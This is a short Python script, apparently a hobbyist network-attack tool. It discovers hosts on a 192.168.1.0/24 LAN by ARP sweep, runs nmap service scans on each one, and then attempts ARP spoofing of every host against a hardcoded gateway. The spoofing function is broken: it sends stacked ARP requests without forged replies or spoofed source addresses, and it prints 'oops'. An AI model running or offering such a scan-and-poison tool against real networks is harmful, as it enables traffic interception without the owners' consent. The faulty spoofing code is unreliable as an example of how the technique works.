from scapy.all import ARP, Ether, srp, sendp
import nmap
import time 

def discover_hosts():
    # Use Scapy to send ARP requests and discover live hosts
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.0/24")
    result = srp(arp_request, timeout=5, verbose=0)[0]

    # Extract live hosts from the result
    live_hosts = [res[1].psrc for res in result]

    return live_hosts

def nmap_scan(ip_address):
    # Use Nmap to perform a basic scan on the specified IP address
    nm = nmap.PortScanner()

    try:
        nm.scan(ip_address, arguments='-p 1-1000 -sV')
        #print(f"Nmap Output: {nm._nmap_last_output}")
    except Exception as e:
        print(f"Error during Nmap scan: {e}")

    # Print scan results
    print(f"Nmap scan results for {ip_address}:")
    for host in nm.all_hosts():
        print(f"Host: {host}")
        print(f"Open ports: {nm[host].all_tcp()}")

        # Check if 'tcp' key is present before attempting to print
        if 'tcp' in nm[host]:
            # Print service information
            print(f"Service information: {nm[host]['tcp'].items()}")
        else:
            print("Service information not available")
        print("-" * 30)

def arp_spoof(target_ip, gateway_ip):
    # Create ARP request packet for the target
    arp_target = ARP(pdst=target_ip)
    
    # Send ARP request and check for response to determine if host is up
    result, _ = srp(arp_target, timeout=2, verbose=0)
    if result:
        # Create ARP response packet for the gateway
        arp_gateway = ARP(pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")

        # Combine the ARP packets into a single Ether packet
        packet = Ether()/arp_target/arp_gateway

        # Send the ARP spoofing packet
        sendp(packet, verbose=1)
        print("oops")
    else:
        print(f"Host {target_ip} is not responding to ARP requests.")

def main():
    live_hosts = discover_hosts()

    if not live_hosts:
        print("No live hosts found.")
        return

    print(f"All live hosts: {live_hosts}")

    # Iterate over all live hosts
    for selected_host in live_hosts:
        print(f"Selected active host: {selected_host}")

        # Perform Nmap scan on the selected host
        nmap_scan(selected_host)

        # Perform ARP spoofing on the selected host and gateway
        gateway_ip = "192.168.1.1"  # Change this to your gateway IP
        arp_spoof(selected_host, gateway_ip)

if __name__ == "__main__":
    main()
